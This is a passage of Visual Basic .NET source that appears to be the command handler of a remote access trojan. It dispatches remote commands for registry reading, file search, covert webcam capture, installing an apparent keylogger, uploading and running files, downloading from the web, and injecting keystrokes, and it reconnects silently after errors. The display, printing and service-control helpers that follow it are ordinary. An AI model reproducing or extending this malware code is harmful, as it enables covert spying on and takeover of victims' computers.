                            Dim regtree As Thread
                            Select Case reg

                                Case "CU"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry2))
                                    regtree.Start(reg & rge)

                                Case "LM"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry2))
                                    regtree.Start(reg & rge)

                                Case "US"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry2))
                                    regtree.Start(reg & rge)

                            End Select

                        Catch ex As Exception

                        End Try

                    Case "/SEARCHSS/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Select Case Tempdata
                                Case "1"
                                    searchflag = True
                                Case "2"
                                    searchflag = False
                                    streamWriter.WriteLine("/SEARCHFL/" & "SEARCHEND")
                                    streamWriter.Flush()
                            End Select

                        Catch ex As Exception

                        End Try


                    Case "/SEARCHFL/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            fileparts = Tempdata.Split("¦")
                            Dim p As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf SearchDirectory))
                            p.Start(fileparts(0))

                        Catch ex As Exception

                        End Try

                    Case "/WEBLISTC/"
                        Try
                            Dim strName As String = Space(100)
                            Dim strVer As String = Space(100)
                            Dim bReturn As Boolean
                            Dim x As Integer = 0
                            Dim sb As New StringBuilder
                            ' 
                            ' Load name of all avialable devices into the lstDevices
                            '

                            Do
                                '
                                '   Get Driver name and version
                                '
                                bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)

                                '
                                ' If there was a device add device name to the list
                                '
                                If bReturn Then sb.Append(strName.Trim & "¦")
                                x += 1
                            Loop Until bReturn = False
                            streamWriter.WriteLine("/WEBLISTC/" & sb.ToString)
                            streamWriter.Flush()
                        Catch ex As Exception

                        End Try



                    Case "/WEBSTART/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            webflag = "Connect"
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf cap))
                            t.Start(Tempdata)

                        Catch ex As Exception

                        End Try

                    Case "/WEBIMAGA/"
                        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                        Select Case Tempdata
                            Case "0"
                                webflag5 = True
                            Case "1"
                                webflag6 = True
                        End Select


                    Case "/WEBIMAGE/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            If Tempdata = "Image" Then
                                webflag2 = "Image"
                            ElseIf Tempdata = "Capture" Then
                                webflag2 = "Capture"
                            End If


                        Catch ex As Exception

                        End Try


                    Case "/WEBSTOPP/"
                        Try
                            webflag5 = False
                            webflag6 = False
                            webflag2 = ""

                        Catch ex As Exception

                        End Try

                    Case "/WEBDISCO/"
                        Try
                            webflag5 = False
                            webflag6 = False
                            webflag2 = Nothing
                            webflag3 = "Disconnect"

                        Catch ex As Exception

                        End Try

                    Case "/INSTALLK/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf installk))
                            t.Start(Tempdata)

                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/UPANDRUN/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf UPANDRUN))
                            t.Start(Tempdata)

                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DDATONWB/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf DDATONWB))
                            t.Start(Tempdata)

                        Catch ex As Exception

                        End Try


                    Case "/SENDKEYB/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf sendkeyb))
                            t.Start(Tempdata)

                        Catch ex As Exception

                        End Try

                    Case "/AVAILABL/"

                    Case Else
                        Tempdata = Nothing
                        Delay(5)
                        restart = restart + 1
                        If restart = 50 Then
                            Try
                                Cleanup()
                                GoTo constart
                            Catch exi As Exception
                                GoTo constart
                            End Try
                        End If
                End Select




            Catch err As Exception

                Try
                    Cleanup()
                    GoTo constart
                Catch exi As Exception
                    GoTo constart
                End Try


            End Try
        Loop
        Try
            Cleanup()
            GoTo constart
        Catch ex As Exception
            GoTo constart
        End Try

    End Sub
#End Region


End Class

#Region "Namespaces..."

Namespace DisplaySettingsSample
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Ansi)> _
    Public Structure DEVMODE
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> _
        Public dmDeviceName As String

        Public dmSpecVersion As Short
        Public dmDriverVersion As Short
        Public dmSize As Short
        Public dmDriverExtra As Short
        Public dmFields As Integer
        Public dmPositionX As Integer
        Public dmPositionY As Integer
        Public dmDisplayOrientation As Integer
        Public dmDisplayFixedOutput As Integer
        Public dmColor As Short
        Public dmDuplex As Short
        Public dmYResolution As Short
        Public dmTTOption As Short
        Public dmCollate As Short

        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> _
        Public dmFormName As String

        Public dmLogPixels As Short
        Public dmBitsPerPel As Short
        Public dmPelsWidth As Integer
        Public dmPelsHeight As Integer
        Public dmDisplayFlags As Integer
        Public dmDisplayFrequency As Integer
        Public dmICMMethod As Integer
        Public dmICMIntent As Integer
        Public dmMediaType As Integer
        Public dmDitherType As Integer
        Public dmReserved1 As Integer
        Public dmReserved2 As Integer
        Public dmPanningWidth As Integer
        Public dmPanningHeight As Integer
    End Structure

    Public Class NativeMethods
        ' PInvoke declaration for EnumDisplaySettings Win32 API
        <DllImport("user32.dll", CharSet:=CharSet.Ansi)> _
        Public Shared Function EnumDisplaySettings(ByVal lpszDeviceName As String, ByVal iModeNum As Integer, ByRef lpDevMode As DEVMODE) As Integer
        End Function

        ' PInvoke declaration for ChangeDisplaySettings Win32 API
        <DllImport("user32.dll", CharSet:=CharSet.Ansi)> _
        Public Shared Function ChangeDisplaySettings(ByRef lpDevMode As DEVMODE, ByVal dwFlags As Integer) As Integer
        End Function

        ' helper for creating an initialized DEVMODE structure
        Public Shared Function CreateDevmode() As DEVMODE
            Dim dm As New DEVMODE()
            dm.dmDeviceName = New String(New Char(31) {})
            dm.dmFormName = New String(New Char(31) {})
            dm.dmSize = CShort(Fix(Marshal.SizeOf(dm)))
            Return dm
        End Function

        ' constants
        Public Const ENUM_CURRENT_SETTINGS As Integer = -1
        Public Const DISP_CHANGE_SUCCESSFUL As Integer = 0
        Public Const DISP_CHANGE_BADDUALVIEW As Integer = -6
        Public Const DISP_CHANGE_BADFLAGS As Integer = -4
        Public Const DISP_CHANGE_BADMODE As Integer = -2
        Public Const DISP_CHANGE_BADPARAM As Integer = -5
        Public Const DISP_CHANGE_FAILED As Integer = -1
        Public Const DISP_CHANGE_NOTUPDATED As Integer = -3
        Public Const DISP_CHANGE_RESTART As Integer = 1
        Public Const DMDO_DEFAULT As Integer = 0
        Public Const DMDO_90 As Integer = 1
        Public Const DMDO_180 As Integer = 2
        Public Const DMDO_270 As Integer = 3
    End Class
End Namespace

Namespace PrintText
    Public Class TextPrint
        ' Inherits all the functionality of a PrintDocument
        Inherits Printing.PrintDocument
        ' Private variables to hold default font and text
        Private fntPrintFont As Font
        Private strText As String
        Public Sub New(ByVal Text As String)
            ' Sets the file stream
            MyBase.New()
            strText = Text
        End Sub
        Public Property Text() As String
            Get
                Return strText
            End Get
            Set(ByVal Value As String)
                strText = Value
            End Set
        End Property
        Protected Overrides Sub OnBeginPrint(ByVal ev _
                                    As Printing.PrintEventArgs)
            ' Run base code
            MyBase.OnBeginPrint(ev)
            ' Sets the default font
            If fntPrintFont Is Nothing Then
                fntPrintFont = New Font("Times New Roman", 12)
            End If
        End Sub
        Public Property Font() As Font
            ' Allows the user to override the default font
            Get
                Return fntPrintFont
            End Get
            Set(ByVal Value As Font)
                fntPrintFont = Value
            End Set
        End Property
        Protected Overrides Sub OnPrintPage(ByVal e As Printing.PrintPageEventArgs)
            ' Provides the print logic for our document

            ' Run base code
            MyBase.OnPrintPage(e)
            ' Variables
            Static intCurrentChar As Integer
            Dim intPrintAreaHeight, intPrintAreaWidth, _
                intMarginLeft, intMarginTop As Integer
            ' Set printing area boundaries and margin coordinates
            With MyBase.DefaultPageSettings
                intPrintAreaHeight = .PaperSize.Height - _
                                   .Margins.Top - .Margins.Bottom
                intPrintAreaWidth = .PaperSize.Width - _
                                  .Margins.Left - .Margins.Right
                intMarginLeft = .Margins.Left 'X
                intMarginTop = .Margins.Top   'Y
            End With
            ' If Landscape set, swap printing height/width
            If MyBase.DefaultPageSettings.Landscape Then
                Dim intTemp As Integer
                intTemp = intPrintAreaHeight
                intPrintAreaHeight = intPrintAreaWidth
                intPrintAreaWidth = intTemp
            End If
            ' Initialise rectangle printing area
            Dim rectPrintingArea As New RectangleF(intMarginLeft, _
                intMarginTop, intPrintAreaWidth, intPrintAreaHeight)
            ' Initialise StringFormat class, for text layout
            Dim objSF As New StringFormat(StringFormatFlags.LineLimit)
            ' Figure out how many lines will fit into rectangle
            Dim intLinesFilled, intCharsFitted As Integer
            e.Graphics.MeasureString(Mid(strText, UpgradeZeros(intCurrentChar)), Font, _
                        New SizeF(intPrintAreaWidth, _
                        intPrintAreaHeight), objSF, _
                        intCharsFitted, intLinesFilled)
            ' Print the text to the page
            e.Graphics.DrawString(Mid(strText, _
                UpgradeZeros(intCurrentChar)), Font, _
                Brushes.Black, rectPrintingArea, objSF)
            ' Increase current char count
            intCurrentChar += intCharsFitted
            ' Check whether we need to print more
            If intCurrentChar < strText.Length Then
                e.HasMorePages = True
            Else
                e.HasMorePages = False
                intCurrentChar = 0
            End If
        End Sub
        Public Function UpgradeZeros(ByVal Input As Integer) As Integer
            ' Upgrades all zeros to ones
            ' - used as opposed to defunct IIF or messy If statements
            If Input = 0 Then
                Return 1
            Else
                Return Input
            End If
        End Function
    End Class
End Namespace

Namespace ServiceControllerExtended
    Public Class ServiceControllerEx
        Inherits ServiceController
        Public Sub New()
            MyBase.New()
        End Sub
        Public Sub New(ByVal name As String)
            MyBase.New(name)
        End Sub
        Public Sub New(ByVal name As String, ByVal machineName As String)
            MyBase.New(name, machineName)
        End Sub

        Public ReadOnly Property Description() As String
            Get
                'construct the management path
                Dim path As String = "Win32_Service.Name='" & Me.ServiceName & "'"
                Dim p As New ManagementPath(path)
                'construct the management object
                Dim ManagementObj As New ManagementObject(p)
                If ManagementObj("Description") IsNot Nothing Then
                    Return ManagementObj("Description").ToString()
                Else
                    Return Nothing
                End If
            End Get
        End Property


        Public Property StartupType() As String
            Get
                If Me.ServiceName IsNot Nothing Then
                    'construct the management path
                    Dim path As String = "Win32_Service.Name='" & Me.ServiceName & "'"
                    Dim p As New ManagementPath(path)
                    'construct the management object
                    Dim ManagementObj As New ManagementObject(p)
                    Return ManagementObj("StartMode").ToString()
                Else
                    Return Nothing
                End If
            End Get
            Set(ByVal value As String)
                If value <> "Automatic" AndAlso value <> "Manual" AndAlso value <> "Disabled" Then

                End If

                If Me.ServiceName IsNot Nothing Then
                    Dim path As String = "Win32_Service.Name='" & Me.ServiceName & "'"
                    Dim p As New ManagementPath(path)
                    Dim ManagementObj As New ManagementObject(p)
                    Dim parameters(0) As Object
                    parameters(0) = value
                    ManagementObj.InvokeMethod("ChangeStartMode", parameters)
                End If
            End Set
        End Property

    End Class

End Namespace



#End Region

Partial Public Class API
    <System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint:="SendMessage")> _
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    End Function
End Class

